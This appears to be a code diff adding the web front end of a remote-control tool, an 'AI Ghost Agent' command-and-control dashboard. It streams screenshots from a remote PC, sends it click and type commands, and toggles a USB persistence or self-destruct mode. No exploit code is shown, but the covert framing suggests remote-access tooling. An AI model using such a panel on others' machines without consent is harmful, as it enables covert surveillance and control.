@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI Ghost Agent Dashboard</title>
+    <script src="/socket.io/socket.io.js"></script>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #0f0f11; color: #fff; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; }
+        .container { max-width: 900px; width: 100%; }
+        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #333; padding-bottom: 15px; margin-bottom: 20px; }
+        .status-badge { padding: 6px 12px; border-radius: 20px; font-weight: bold; font-size: 14px; }
+        .online { background-color: rgba(16, 185, 129, 0.2); color: #10b981; border: 1px solid rgba(16, 185, 129, 0.5); }
+        .offline { background-color: rgba(239, 68, 68, 0.2); color: #ef4444; border: 1px solid rgba(239, 68, 68, 0.5); }
+        
+        .controls { display: flex; gap: 15px; background: #1a1a1e; padding: 15px; border-radius: 8px; margin-bottom: 20px; border: 1px solid #333; align-items: center;}
+        
+        /* Toggle Switch styles */
+        .switch-container { display: flex; align-items: center; gap: 10px; }
+        .switch { position: relative; display: inline-block; width: 50px; height: 26px; }
+        .switch input { opacity: 0; width: 0; height: 0; }
+        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #3f3f46; transition: .3s; border-radius: 26px; }
+        .slider:before { position: absolute; content: ""; height: 18px; width: 18px; left: 4px; bottom: 4px; background-color: white; transition: .3s; border-radius: 50%; }
+        input:checked + .slider { background-color: #8b5cf6; }
+        input:checked + .slider:before { transform: translateX(24px); }
+        .mode-text { font-size: 14px; font-weight: 500; }
+        .mode-desc { font-size: 11px; color: #a1a1aa; margin-top: 4px; }
+
+        .screen-container { width: 100%; aspect-ratio: 16/9; background: #000; border: 2px solid #333; border-radius: 8px; overflow: hidden; position: relative; display: flex; align-items: center; justify-content: center; margin-bottom: 20px; }
+        #screenImage { max-width: 100%; max-height: 100%; display: none; }
+        .waiting-text { color: #52525b; font-size: 18px; }
+
+        .command-box { display: flex; gap: 10px; }
+        input[type="text"] { flex: 1; padding: 12px; border-radius: 6px; border: 1px solid #3f3f46; background: #27272a; color: white; outline: none; }
+        input[type="text"]:focus { border-color: #60a5fa; }
+        button { padding: 12px 20px; border: none; border-radius: 6px; background: #2563eb; color: white; font-weight: bold; cursor: pointer; transition: 0.2s; }
+        button:hover { background: #1d4ed8; }
+        button:disabled { background: #3f3f46; color: #a1a1aa; cursor: not-allowed; }
+        
+        .terminal { background: #000; color: #0f0; font-family: monospace; padding: 15px; border-radius: 6px; margin-top: 20px; height: 150px; overflow-y: auto; font-size: 13px; }
+        .terminal p { margin: 2px 0; }
+        .hb-indicator { width: 10px; height: 10px; border-radius: 50%; background: #ef4444; display: inline-block; margin-right: 8px; transition: background 0.2s; }
+        .hb-pulse { background: #10b981; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div>
+                <h1 style="margin:0; font-size: 24px;">AI Ghost Agent</h1>
+                <p style="margin:5px 0 0 0; color: #a1a1aa; font-size: 14px;">Remote Command & Control</p>
+            </div>
+            <div id="statusBadge" class="status-badge offline">🔴 OFFLINE</div>
+        </div>
+
+        <div class="controls">
+            <div class="switch-container">
+                <div>
+                    <div class="mode-text">Ghost Persistence Mode (Mod A)</div>
+                    <div class="mode-desc">If ON, Agent ignores USB disconnects. If OFF, Agent self-destructs when USB is pulled.</div>
+                </div>
+                <label class="switch" style="margin-left: auto;">
+                    <input type="checkbox" id="modeSwitch">
+                    <span class="slider"></span>
+                </label>
+            </div>
+            <div style="margin-left: 20px; padding-left: 20px; border-left: 1px solid #333; display: flex; align-items: center;">
+                <span id="hbLight" class="hb-indicator"></span> <span style="font-size: 12px; color: #a1a1aa;">Heartbeat</span>
+            </div>
+        </div>
+
+        <div class="screen-container">
+            <div id="waitingText" class="waiting-text">Waiting for agent screen feed...</div>
+            <img id="screenImage" alt="Live PC Screen">
+        </div>
+
+        <div class="command-box">
+            <input type="text" id="cmdInput" placeholder="Type a command for the AI (e.g., 'click Chrome', 'type Hello')" disabled>
+            <button id="sendBtn" disabled>Send Command</button>
+        </div>
+
+        <div class="terminal" id="terminalLog">
+            <p>> C2 Dashboard Initialized.</p>
+            <p>> Connecting to server...</p>
+        </div>
+    </div>
+
+    <script>
+        const socket = io();
+        
+        const statusBadge = document.getElementById('statusBadge');
+        const screenImage = document.getElementById('screenImage');
+        const waitingText = document.getElementById('waitingText');
+        const modeSwitch = document.getElementById('modeSwitch');
+        const cmdInput = document.getElementById('cmdInput');
+        const sendBtn = document.getElementById('sendBtn');
+        const terminalLog = document.getElementById('terminalLog');
+        const hbLight = document.getElementById('hbLight');
+
+        let isOnline = false;
+
+        function log(msg) {
+            const p = document.createElement('p');
+            p.textContent = `> ${msg}`;
+            terminalLog.appendChild(p);
+            terminalLog.scrollTop = terminalLog.scrollHeight;
+        }
+
+        socket.on('connect', () => {
+            log('Connected to C2 Server.');
+            socket.emit('identify', 'web');
+        });
+
+        socket.on('agent_status', (data) => {
+            isOnline = data.online;
+            if (isOnline) {
+                statusBadge.className = 'status-badge online';
+                statusBadge.textContent = '🟢 ONLINE';
+                cmdInput.disabled = false;
+                sendBtn.disabled = false;
+                log('Ghost Agent is ONLINE.');
+            } else {
+                statusBadge.className = 'status-badge offline';
+                statusBadge.textContent = '🔴 OFFLINE';
+                cmdInput.disabled = true;
+                sendBtn.disabled = true;
+                screenImage.style.display = 'none';
+                waitingText.style.display = 'block';
+                log('Ghost Agent went OFFLINE.');
+            }
+
+            // Sync the toggle switch
+            if (data.mode === 'A') {
+                modeSwitch.checked = true;
+                log('Agent is currently in Persistent Ghost Mode (A).');
+            } else {
+                modeSwitch.checked = false;
+                log('Agent is currently in Safety Tether Mode (B).');
+            }
+        });
+
+        socket.on('new_screenshot', (base64Img) => {
+            waitingText.style.display = 'none';
+            screenImage.style.display = 'block';
+            screenImage.src = 'data:image/jpeg;base64,' + base64Img;
+        });
+
+        socket.on('heartbeat_received', () => {
+            hbLight.classList.add('hb-pulse');
+            setTimeout(() => {
+                hbLight.classList.remove('hb-pulse');
+            }, 300);
+        });
+
+        socket.on('error_msg', (msg) => {
+            log(`ERROR: ${msg}`);
+        });
+
+        // Mode Toggling
+        modeSwitch.addEventListener('change', (e) => {
+            const newMode = e.target.checked ? 'A' : 'B';
+            socket.emit('toggle_mode', newMode);
+            log(`Requesting mode change to: ${newMode}`);
+        });
+
+        // Sending Commands
+        const sendCommand = () => {
+            const cmd = cmdInput.value.trim();
+            if (cmd && isOnline) {
+                socket.emit('send_command', cmd);
+                log(`Sent command: ${cmd}`);
+                cmdInput.value = '';
+            }
+        };
+
+        sendBtn.addEventListener('click', sendCommand);
+        cmdInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') sendCommand();
+        });
+    </script>
+</body>
+</html>
